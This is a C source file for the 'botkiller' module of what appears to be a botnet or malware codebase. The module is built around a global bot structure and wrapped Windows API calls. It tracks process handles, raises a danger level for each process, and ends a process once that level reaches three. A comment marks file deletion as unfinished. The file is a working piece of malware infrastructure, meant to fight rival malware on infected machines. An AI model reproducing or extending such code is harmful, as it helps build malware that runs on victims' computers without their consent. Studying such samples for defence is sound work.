#include "botkiller.h"

#ifdef MODULE_BOTKILLER
#include "../common/mem.h"
#include "pipes.h"
#include "ipc.h"

#ifdef MODULE_DEBUG
#include "debug.h"
#endif

extern bot_t bot;

static botkill_process_t* pBotkillProcesses = NULL;
static DWORD dwBotkillProcessCount = 0;
static RTL_CRITICAL_SECTION csBotkiller;

void WINAPI InitBotkiller(void)
{
	pBotkillProcesses = NULL;
	dwBotkillProcessCount = 0;
	CWA(RtlInitializeCriticalSection)(&csBotkiller);
}

void WINAPI AddBotkillHandle(HANDLE hProcess)
{
	botkill_process_t* pNewProcess;
	DWORD dwIndex;
	unsigned int i;

	dwIndex = 0;
	pNewProcess = NULL;

	CWA(RtlEnterCriticalSection)(&csBotkiller);

	for (i = 0; i < dwBotkillProcessCount; i++)
	{
		if (pBotkillProcesses[i].hProcess == INVALID_HANDLE_VALUE)
		{
			pNewProcess = &pBotkillProcesses[i];
			dwIndex = i;
			break;
		}
	}

	if (pNewProcess == NULL && memreallocEx(&pBotkillProcesses, sizeof(botkill_process_t) * (dwBotkillProcessCount + 1)))
	{
		dwIndex = dwBotkillProcessCount++;
		pNewProcess = &pBotkillProcesses[dwIndex];
	}

	if (pNewProcess != NULL)
	{
		pNewProcess->hProcess = hProcess;
		pNewProcess->iDangerLevel = 0;
	}

	CWA(RtlLeaveCriticalSection)(&csBotkiller);
}

static DWORD _FindProcess(HANDLE hProcess)
{
	unsigned int i;

	for (i = 0; i < dwBotkillProcessCount; i++)
	{
		if (pBotkillProcesses[i].hProcess == hProcess)
			return i;
	}

	return -1;
}

void WINAPI RemoveBotkillHandle(HANDLE hProcess)
{
	DWORD dwIndex, dwNewCount;
	botkill_process_t* pProcess;

	CWA(RtlEnterCriticalSection)(&csBotkiller);

	if ((dwIndex = _FindProcess(hProcess)) != -1)
	{
		pProcess = &pBotkillProcesses[dwIndex];
		pProcess->hProcess = INVALID_HANDLE_VALUE;
		pProcess->iDangerLevel = 0;

		dwNewCount = dwBotkillProcessCount;

		while (dwNewCount > 0 && pBotkillProcesses[dwNewCount - 1].hProcess == INVALID_HANDLE_VALUE) dwNewCount--;

		if (dwNewCount != dwBotkillProcessCount)
		{
			if (dwNewCount == 0)
			{
				memfree(pBotkillProcesses);
				pBotkillProcesses = NULL;
			}
			else memreallocEx(&pBotkillProcesses, sizeof(botkill_process_t) * dwNewCount);

			dwBotkillProcessCount = dwNewCount;
		}
	}

	CWA(RtlLeaveCriticalSection)(&csBotkiller);
}

void WINAPI IncreaseDangerLevel(HANDLE hProcess, unsigned int iValue)
{
	botkill_process_t* pProcess;
	DWORD dwIndex;

#ifdef WDEBUG
	WDEBUG("Called.");
#endif

	CWA(RtlEnterCriticalSection)(&csBotkiller);

	if((dwIndex = _FindProcess(hProcess)) != -1)
	{
		pProcess = &pBotkillProcesses[dwIndex];

		pProcess->iDangerLevel += iValue;

		if(pProcess->iDangerLevel >= 3)
		{
#ifdef WDEBUG
			WDEBUG("Process has been deemed malicious by danger level.");
#endif
			KillMalware();
		}
	}

	CWA(RtlLeaveCriticalSection)(&csBotkiller);
}

/*
	Kills process and deletes file.

	ToDo:
	- Delete file
*/
void WINAPI KillMalware(void)
{
#ifdef WDEBUG
	WDEBUG("Called.");
#endif
	bot.api.pExitProcess(0);
}
#endif